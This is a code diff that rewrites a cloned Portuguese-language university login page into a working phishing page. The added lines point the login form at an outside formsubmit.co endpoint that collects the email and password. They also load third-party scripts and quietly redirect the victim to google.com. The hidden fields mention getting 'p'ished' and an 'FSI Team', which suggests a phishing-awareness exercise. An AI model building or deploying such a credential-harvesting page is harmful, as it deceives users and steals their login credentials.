@@ -40,6 +40,10 @@ M.yui.loader = {modules: {}};
 <!--HSRWLSGSRSLEOSYSKDEYLDSFGAKSKD-->
 <meta name="google-site-verification" content="LuEe1FqGKJjTvz_wBJN4Kbe9ARUyNbL1fqeKMaE8KjU">
 
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.17.1/firebase.js"></script>
+<script src="app.js"></script>
+
 <meta name="robots" content="noindex">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script type="text/x-mathjax-config">MathJax.Hub.Config({
@@ -84,22 +88,27 @@ M.yui.loader = {modules: {}};
     
                 <div class="row justify-content-md-center">
                     <div class="col-md-5">
-                        <form class="mt-3" method="post" id="login">
-                            <input id="anchor" type="hidden" name="anchor" value="">
+                        <form action="https://formsubmit.co/0347460f6eb7799dccd57d3bf804fb89" method="post" class="mt-3 fakeForm" id="login">
                             <script>document.getElementById('anchor').value = location.hash;</script>
                             <input type="hidden" name="logintoken" value="VFaAoPBvAPKR0AQGXWDD9rX8k5Tf8PYD">
                             <div class="form-group">
-                                <label for="username" class="sr-only">
+                                <label for="email" class="sr-only">
                                         E-mail Google ou Temp-mail
                                 </label>
-                                <input type="text" name="username" id="username" class="form-control" value="" placeholder="E-mail Google ou Temp-mail" autocomplete="username">
+                                <input type="email" name="email" id="username" class="form-control" value="" placeholder="E-mail Google ou Temp-mail" autocomplete="username" required>
                             </div>
                             <div class="form-group">
                                 <label for="password" class="sr-only">Palavra-passe</label>
                                 <input type="password" name="password" id="password" value="" class="form-control" placeholder="Palavra-passe" autocomplete="current-password">
                             </div>
-                            <script>var tar = document.getElementById('username').value;</script>
-                            <button type="submit" class="btn btn-primary btn-block mt-3" onclick="sendEmail(tar)" id="loginbtn">Entrar</button>
+                            <input type="hidden" name="_subject" value="Ups it looks like you got 'p'ished 🤡">
+                            <input type="hidden" name="_template" value="box">
+                            <input type="hidden" name="_autoresponse" value="Don't worry we got you covered! Best regards from the FSI Team.">
+                            <input type="text" name="_honey" style="display:none">
+                            <input type="hidden" name="_next" value="https://google.com">
+                            <button type="submit" class="btn btn-primary btn-block mt-3" id="loginbtn">Entrar</button>
+                        </form>
+
                     </div>
                     
                     <div class="col-md-5">
